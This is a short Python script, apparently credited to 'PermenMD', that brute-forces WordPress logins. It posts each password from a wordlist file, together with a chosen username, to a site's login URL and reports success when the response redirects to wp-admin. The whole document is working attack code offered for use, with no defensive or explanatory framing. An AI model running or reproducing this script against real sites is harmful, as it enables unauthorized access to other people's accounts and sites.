# PermenMD's WordPress Brute Force Script
import requests
import sys

def brute_force(username, password_list, url):
    for password in password_list:
        payload = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In'
        }
        response = requests.post(url, data=payload)
        if 'wp-admin' in response.url:
            print(f"Login successful! Username: {username}, Password: {password}")
            return True
    print("Brute force unsuccessful.")
    return False

def read_passwords_from_file(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python script.py <username> <password_file> <wordpress_url>")
        sys.exit(1)

    username = sys.argv[1]
    password_file = sys.argv[2]
    wordpress_url = sys.argv[3]

    passwords = read_passwords_from_file(password_file)

    brute_force(username, passwords, wordpress_url)
